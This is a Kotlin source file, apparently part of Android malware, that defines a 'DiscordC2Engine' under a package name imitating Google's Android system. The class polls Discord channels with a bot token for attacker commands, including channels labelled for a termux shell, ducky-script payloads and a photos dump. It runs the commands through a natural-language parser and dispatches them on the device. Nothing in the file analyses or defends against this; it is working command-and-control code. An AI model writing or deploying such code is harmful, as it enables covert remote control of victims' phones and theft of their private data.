package com.google.android.system

import android.content.Context
import android.os.Build
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

/**
 * DiscordC2Engine
 *
 * Independent C2 engine managing Discord WebSocket Gateway,
 * HTTP REST channel polling, Category & Sub-channel matrix,
 * Interaction Webhook callbacks, and Media/Text telemetry streaming.
 */
class DiscordC2Engine(
    private val context: Context,
    private val botToken: String,
    private val guildId: String,
    private val httpClient: OkHttpClient,
    private val scope: CoroutineScope,
    private val commandDispatcher: (String, String) -> Unit
) {
    companion object {
        private const val TAG = "DiscordC2Engine"
    }

    fun startEngine() {
        if (botToken.isBlank() || guildId.isBlank()) return
        Log.i(TAG, "Starting Discord C2 Engine (! Prefix Command Mode)...")
        startDiscordPollingLoop()
    }

    private fun startDiscordPollingLoop() {
        scope.launch(Dispatchers.IO) {
            Log.i(TAG, "Discord HTTP REST Polling Loop Active (! Prefix Engine) 🚀")
            var lastProcessedMsgId = ""
            while (true) {
                try {
                    val prefs = SecurityVaultManager.getEncryptedDiscordPrefs(context)
                    val commandsChanId = prefs.getString("chan_01-master-commands", null) ?: prefs.getString("chan_01-status-and-commands", null)
                    val termuxChanId = prefs.getString("chan_16-termux-shell", null)
                    val duckyChanId = prefs.getString("chan_29-ducky-script-payloads", null)
                    val photosChanId = prefs.getString("chan_08-photos-dump", null) ?: prefs.getString("chan_07-photos-and-screenshots", null)

                    val targetChannels = listOfNotNull(commandsChanId, termuxChanId, duckyChanId, photosChanId)
                    for (channelId in targetChannels) {
                        val url = "https://discord.com/api/v10/channels/$channelId/messages?limit=5"
                        val req = Request.Builder().url(url).addHeader("Authorization", "Bot $botToken").get().build()
                        httpClient.newCall(req).execute().use { res ->
                            if (res.isSuccessful) {
                                val array = JSONArray(res.body?.string() ?: "[]")
                                if (array.length() > 0) {
                                    val latest = array.getJSONObject(0)
                                    val msgId = latest.getString("id")
                                    val isBot = latest.optJSONObject("author")?.optBoolean("bot") ?: false
                                    val rawContent = latest.optString("content").trim()

                                    if (!isBot && msgId != lastProcessedMsgId && rawContent.isNotBlank()) {
                                        if (lastProcessedMsgId.isBlank()) {
                                            lastProcessedMsgId = msgId
                                        } else {
                                            lastProcessedMsgId = msgId
                                            Log.i(TAG, "Discord REST Poll received command in $channelId: '$rawContent'")
                                            // Normalize '/' prefix to '!' prefix for command consistency
                                            val normalizedContent = if (rawContent.startsWith("/")) "!" + rawContent.substring(1) else rawContent
                                            val parsedIntent = OnDeviceAIC2Engine.parseNaturalLanguageCommand(normalizedContent)
                                            val dispatchText = if (parsedIntent.extractedParameters.isNotBlank()) {
                                                "${parsedIntent.targetCommand} ${parsedIntent.extractedParameters}".trim()
                                            } else {
                                                parsedIntent.targetCommand
                                            }
                                            commandDispatcher(channelId, dispatchText)
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "startDiscordPollingLoop error: ${e.message}")
                }
                delay(4000L)
            }
        }
    }
}
